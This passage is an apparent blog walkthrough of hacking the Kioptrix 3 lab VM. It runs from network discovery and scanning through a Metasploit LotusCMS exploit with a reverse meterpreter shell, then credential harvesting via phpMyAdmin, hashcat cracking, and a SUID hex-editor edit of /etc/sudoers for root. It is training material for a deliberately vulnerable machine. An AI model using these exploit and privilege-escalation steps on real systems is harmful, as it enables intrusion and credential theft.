<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Metasploit</li>
<li>Wfuzz</li>
<li>Hashcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.184 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Ports 22 and 80 are opening.</p>

<p>Now use Nikto to scan:</p>

<p><code>nikto -h 192.168.79.184</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Nothing excited.</p>

<p>Now lets browser the web page in the target.</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Find the target may use LotusCMS.</p>

<p>In msfconsole:</p>

<p><code>search LotusCMS</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find one exploit</p>

<pre><code>msf &gt; use exploit/multi/http/lcms_php_exec 
msf exploit(lcms_php_exec) &gt; set rhost 192.168.79.184
msf exploit(lcms_php_exec) &gt; set uri 
msf exploit(lcms_php_exec) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(lcms_php_exec) &gt; set lhost 192.168.79.173
exploit
</code></pre>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Got the shell, next step is try to get root.</p>

<p>In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>maybe the  username/password for ssh, but no. Thats too easy.</p>

<p>So that I go back to use wfuzz the scan the http services.</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it has phpmyadmin. Try that:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>Log in using the username/password that just found. Successed.</p>

<p>review the content, found this:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>now found two users and the hashed passwords:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Copy the passwords to a file use hashcat to crack it:</p>

<p><code>hashcat hash.txt /user/share/wordlists/rockyou.txt</code></p>

<p>get both passwords:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>ssh to the target, search the SUID binaries:</p>

<p><code>find / -perm +6000 -type f -exec ls -ld {} \;</code></p>

<p>found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.</p>

<p>now try to use it to open /etc/sudoers file, get error message. to fix it:</p>

<p><code>export TERM=xterm</code></p>

<p>change the loneferret permission:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>get the root</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
</feed>
